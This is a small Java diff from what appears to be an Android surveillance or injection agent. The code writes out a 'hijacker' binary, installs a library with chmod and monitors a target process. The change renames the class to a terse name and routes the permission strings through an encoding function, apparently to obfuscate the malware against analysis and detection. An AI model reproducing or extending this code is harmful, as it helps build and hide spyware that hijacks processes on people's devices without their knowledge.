@@ -20,7 +20,7 @@ import com.android.dvci.file.AutoFile;
 
 import com.android.mm.M;
 
-public class Instrument {
+public class Inst {
 	private static final String TAG = "Instrument";
 	private static final int MAX_KILLED = 3;
 	private String proc;
@@ -31,7 +31,7 @@ public class Instrument {
 	private Thread monitor;
 	private int killed = 0;
 
-	public Instrument(String process, String dump) {
+	public Inst(String process, String dump) {
 		final File filesPath = Status.getAppContext().getFilesDir();
 
 		proc = process;
@@ -69,8 +69,8 @@ public class Instrument {
 			Utils.dumpAsset(M.e("mb.data"), hijacker);
 
 			// Install library
-			Execute.chmod("666", path + "/" + lib);
-			Execute.chmod("750",  path + "/" + hijacker);
+			Execute.chmod(M.e("666"), path + "/" + lib);
+			Execute.chmod(M.e("750"),  path + "/" + hijacker);
 
 		} catch (Exception e) {
 			if (Cfg.EXCEPTION) {
